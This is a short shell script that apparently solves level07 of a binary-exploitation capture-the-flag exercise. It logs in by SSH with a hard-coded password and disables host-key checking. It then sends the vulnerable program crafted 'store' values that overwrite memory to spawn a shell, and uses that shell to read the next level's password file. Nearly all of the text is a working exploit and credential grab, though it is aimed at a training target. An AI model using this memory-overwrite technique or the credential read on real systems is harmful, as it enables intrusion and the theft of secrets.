#!/bin/sh
PASS='GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8'
sshpass -p $PASS ssh -q -tt -o StrictHostKeyChecking=no level07@$OVERRIDE -p 4242 << EOF
rm /tmp/level07
SHELL=/bin/sh
(python -c "print 'store\n4159090384\n1073741938\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit\n'"; echo cat /home/users/level08/.pass; echo pkill -9 level07) | ./level07 > /tmp/level07
echo -e "\e[32m\$(awk 'NR==14 {print; exit}' /tmp/level07 | cut -c33-)\e[39m"
exit
EOF